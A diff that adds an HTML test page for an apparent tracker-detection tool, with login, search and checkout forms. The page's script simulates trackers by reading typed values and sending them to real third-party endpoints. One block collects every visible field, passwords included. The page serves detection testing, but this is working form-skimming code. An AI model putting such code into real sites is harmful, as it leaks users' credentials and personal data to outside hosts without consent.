@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>wearesilent test page</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: system-ui, sans-serif; background: #111; color: #eee; padding: 40px; max-width: 600px; margin: 0 auto; }
+    h1 { font-size: 20px; margin-bottom: 8px; }
+    p.sub { color: #888; font-size: 13px; margin-bottom: 32px; }
+    fieldset { border: 1px solid #333; border-radius: 8px; padding: 16px; margin-bottom: 20px; }
+    legend { color: #ff6b6b; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; padding: 0 8px; }
+    label { display: block; font-size: 13px; color: #aaa; margin: 10px 0 4px; }
+    label:first-of-type { margin-top: 0; }
+    input, textarea { width: 100%; padding: 8px 10px; background: #1a1a2e; border: 1px solid #333; border-radius: 4px; color: #eee; font-size: 14px; }
+    textarea { height: 60px; resize: vertical; }
+    button { margin-top: 16px; padding: 8px 20px; background: #333; border: 1px solid #555; border-radius: 4px; color: #eee; cursor: pointer; font-size: 13px; }
+    #log { margin-top: 32px; padding: 16px; background: #0a0a1a; border-radius: 8px; font-family: monospace; font-size: 11px; color: #666; max-height: 200px; overflow-y: auto; }
+    #log div { margin-bottom: 4px; }
+    #log .sent { color: #e74c3c; }
+  </style>
+</head>
+<body>
+  <h1>wearesilent test page</h1>
+  <p class="sub">Type in the fields below. Simulated trackers will exfiltrate your input to fake cross-origin endpoints.</p>
+
+  <fieldset>
+    <legend>Login</legend>
+    <label for="email">Email</label>
+    <input type="email" id="email" name="email" placeholder="you@example.com" autocomplete="off">
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" placeholder="password" autocomplete="off">
+  </fieldset>
+
+  <fieldset>
+    <legend>Search</legend>
+    <label for="q">Search query</label>
+    <input type="search" id="q" name="q" placeholder="Search for something..." autocomplete="off">
+  </fieldset>
+
+  <fieldset>
+    <legend>Checkout</legend>
+    <label for="full_name">Full name</label>
+    <input type="text" id="full_name" name="full_name" placeholder="John Doe" autocomplete="off">
+    <label for="phone">Phone</label>
+    <input type="tel" id="phone" name="phone" placeholder="+1 555 123 4567" autocomplete="off">
+    <label for="address">Address</label>
+    <textarea id="address" name="address" placeholder="123 Main St, City" autocomplete="off"></textarea>
+  </fieldset>
+
+  <fieldset>
+    <legend>Newsletter</legend>
+    <label for="signup_email">Email</label>
+    <input type="email" id="signup_email" name="signup_email" placeholder="you@example.com" autocomplete="off">
+  </fieldset>
+
+  <button onclick="return false">Submit (does nothing)</button>
+
+  <div id="log"><div>Tracker activity log:</div></div>
+
+  <script>
+    // Simulated third-party trackers that read form values and exfiltrate them.
+    // These use real cross-origin requests to trigger wearesilent detection.
+
+    var log = document.getElementById("log");
+    function logSend(tracker, field, dest) {
+      var d = document.createElement("div");
+      d.className = "sent";
+      d.textContent = "[" + tracker + "] read " + field + " → " + dest;
+      log.appendChild(d);
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // --- Simulated Google Analytics ---
+    // Reads search field, sends via Image pixel
+    setInterval(function () {
+      var q = document.getElementById("q");
+      if (q.value.length >= 4) {
+        var url = "https://www.google-analytics.com/collect?v=1&t=event&ec=search&ea=query&el=" + encodeURIComponent(q.value);
+        new Image().src = url;
+        logSend("Google Analytics", "q", "google-analytics.com");
+      }
+    }, 3000);
+
+    // --- Simulated Meta Pixel ---
+    // Reads email fields, sends via sendBeacon
+    setInterval(function () {
+      var fields = document.querySelectorAll('input[type="email"]');
+      for (var i = 0; i < fields.length; i++) {
+        if (fields[i].value.length >= 4) {
+          var payload = "id=123456&ev=Lead&cd[email]=" + encodeURIComponent(fields[i].value);
+          try {
+            navigator.sendBeacon("https://www.facebook.com/tr/", payload);
+          } catch(e) {}
+          logSend("Meta Pixel", fields[i].name || fields[i].id, "facebook.com");
+        }
+      }
+    }, 4000);
+
+    // --- Simulated Hotjar session replay ---
+    // Reads all visible inputs, sends via fetch
+    setInterval(function () {
+      var inputs = document.querySelectorAll("input:not([type=hidden]), textarea");
+      var data = {};
+      var hasData = false;
+      for (var i = 0; i < inputs.length; i++) {
+        if (inputs[i].value.length >= 4) {
+          data[inputs[i].name || inputs[i].id] = inputs[i].value;
+          hasData = true;
+        }
+      }
+      if (hasData) {
+        try {
+          fetch("https://in.hotjar.com/api/v2/client/sites/0/visit-data", {
+            method: "POST",
+            body: JSON.stringify(data)
+          }).catch(function(){});
+        } catch(e) {}
+        logSend("Hotjar", "all fields", "hotjar.com");
+      }
+    }, 5000);
+
+    // --- Simulated Klaviyo marketing ---
+    // Reads email on blur, sends via XHR
+    document.addEventListener("change", function (e) {
+      if (e.target.type === "email" && e.target.value.length >= 4) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://a.klaviyo.com/api/identify");
+        xhr.setRequestHeader("Content-Type", "application/json");
+        try {
+          xhr.send(JSON.stringify({ email: e.target.value }));
+        } catch(e) {}
+        logSend("Klaviyo", e.target.name || e.target.id, "klaviyo.com");
+      }
+    });
+
+    // --- Simulated TikTok Pixel ---
+    // Reads phone + name on interval, sends via Image pixel
+    setInterval(function () {
+      var phone = document.getElementById("phone");
+      var name = document.getElementById("full_name");
+      if (phone.value.length >= 4) {
+        new Image().src = "https://analytics.tiktok.com/api/v2/pixel?ev=Contact&phone=" + encodeURIComponent(phone.value);
+        logSend("TikTok Pixel", "phone", "tiktok.com");
+      }
+      if (name.value.length >= 4) {
+        new Image().src = "https://analytics.tiktok.com/api/v2/pixel?ev=Contact&name=" + encodeURIComponent(name.value);
+        logSend("TikTok Pixel", "full_name", "tiktok.com");
+      }
+    }, 4500);
+
+    // --- Simulated Shopify Analytics ---
+    // Reads email at checkout, sends via fetch
+    setInterval(function () {
+      var email = document.getElementById("signup_email");
+      if (email.value.length >= 4) {
+        try {
+          fetch("https://otlp-http-production.shopifysvc.com/v1/traces", {
+            method: "POST",
+            body: JSON.stringify({ email: email.value })
+          }).catch(function(){});
+        } catch(e) {}
+        logSend("Shopify Analytics", "signup_email", "shopifysvc.com");
+      }
+    }, 5500);
+  </script>
+</body>
+</html>
